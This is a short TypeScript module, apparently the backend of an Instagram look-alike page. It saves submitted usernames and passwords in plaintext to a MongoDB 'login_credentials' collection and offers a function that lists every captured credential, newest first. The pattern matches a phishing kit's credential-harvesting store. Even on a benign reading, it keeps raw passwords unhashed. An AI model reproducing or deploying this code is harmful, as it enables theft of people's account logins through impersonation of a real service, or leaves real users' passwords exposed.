
import { MongoClient, ServerApiVersion, Document, WithId } from 'mongodb';

// Define the Credential type that matches our application needs
export interface Credential {
  _id: string;
  username: string;
  password: string;
  timestamp: string;
}

// The MongoDB connection URL (this should come from environment variables in a real app)
// For a demo, we'll use a placeholder - in a real app, this would be a secret
const uri = "mongodb+srv://<username>:<password>@cluster0.mongodb.net/?retryWrites=true&w=majority";

// Create a MongoClient with connection options
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

export async function storeLoginCredential(username: string, password: string) {
  try {
    // Connect to the MongoDB server
    await client.connect();
    
    // Access the database and collection
    const database = client.db('instagram_clone');
    const collection = database.collection('login_credentials');
    
    // Create a document to insert
    const doc = {
      username,
      password,
      timestamp: new Date(),
    };
    
    // Insert the document
    const result = await collection.insertOne(doc);
    console.log(`A document was inserted with the _id: ${result.insertedId}`);
    
    return { success: true, id: result.insertedId };
  } catch (error) {
    console.error("Failed to store login credential:", error);
    return { success: false, error };
  } finally {
    // Close the connection when done
    await client.close();
  }
}

export async function getLoginCredentials() {
  try {
    // Connect to the MongoDB server
    await client.connect();
    
    // Access the database and collection
    const database = client.db('instagram_clone');
    const collection = database.collection('login_credentials');
    
    // Find all documents in the collection and transform them to match our Credential type
    const documents = await collection.find().sort({ timestamp: -1 }).toArray();
    
    // Transform the MongoDB documents to our Credential type
    const credentials: Credential[] = documents.map((doc: WithId<Document>) => ({
      _id: doc._id.toString(),
      username: doc.username as string,
      password: doc.password as string,
      timestamp: doc.timestamp ? doc.timestamp.toString() : new Date().toString()
    }));
    
    return { success: true, data: credentials };
  } catch (error) {
    console.error("Failed to get login credentials:", error);
    return { success: false, error };
  } finally {
    // Close the connection when done
    await client.close();
  }
}
